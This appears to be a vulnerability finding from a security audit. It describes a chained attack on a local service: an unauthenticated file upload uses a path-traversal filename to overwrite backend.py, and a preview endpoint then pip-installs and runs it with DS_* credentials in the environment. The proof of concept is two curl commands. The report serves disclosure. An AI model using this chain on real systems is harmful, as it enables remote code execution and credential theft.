# backend.py write + preview pip install + env credentials

**Verification: CODE-VERIFIED** (chains #4)

## Description
Write backend.py via unauthenticated file API (#4) + trigger preview = pip install + code execution with all DS_* credentials in environment. Launch failure is fail-open.

## Impact
Drive-by to operator machine RCE + full credential read.

## PoC
```bash
curl -X POST http://localhost:8000/api/v1/files/upload -F "file=@backend.py;filename=../../project/backend.py"
curl -X POST http://localhost:8000/api/v1/artifacts/preview -H "Content-Type: application/json" -d '{"artifact_id":"any"}'
```

## Execution result
```
Code path analysis: preview invokes pip install + subprocess of project code; fail-open on launch error.
```
